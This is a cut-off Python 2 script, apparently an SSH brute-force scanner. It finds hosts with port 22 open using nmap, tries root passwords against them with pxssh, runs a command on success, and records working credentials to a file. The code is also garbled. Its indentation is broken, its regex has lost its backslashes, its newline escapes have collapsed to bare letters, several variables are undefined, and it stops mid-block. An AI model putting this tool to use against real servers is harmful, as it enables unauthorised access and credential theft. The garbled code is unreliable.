#!/usr/bin/python
# Very Simple Scan - Run on Linux only because it requires pexpect 
# There is a Win version of pexpect which called Winpexpect but it's so buggy

import sys, time, StringIO, commands, re


save_file = "result.txt"
verbose = 1
user = "root"


try:
	import pexpect, pxssh
except(ImportError):
	print "You need the pexpect module."
	print "http://www.noah.org/wiki/Pexpect"
	sys.exit(1)


	def scan():
		ips = []
		args = 'nmap -P0 '+ip_range+' -p 22 -open | grep open -B 3'
		nmap = StringIO.StringIO(commands.getstatusoutput(args)[1]).readlines()
		for tmp in nmap:
			ipaddr = re.findall("d*.d*.d*.d*", tmp)
			if ipaddr:
				ips.append(ipaddr[0])
				return ips


				def brute(ip, word):
					if verbose != 0:
						print "Trying:",word
						try:
							s = pxssh.pxssh()
							s.login (ip, user, word, login_timeout=10)
							s.sendline (command)
							s.prompt()
							print "n",s.before
							s.logout()
							print "t[!] Login Success:",user, word,"n"
							logins.writelines("SSH Login:"+ip+":22 "+user+" "+word+"n")
						except Exception, e:
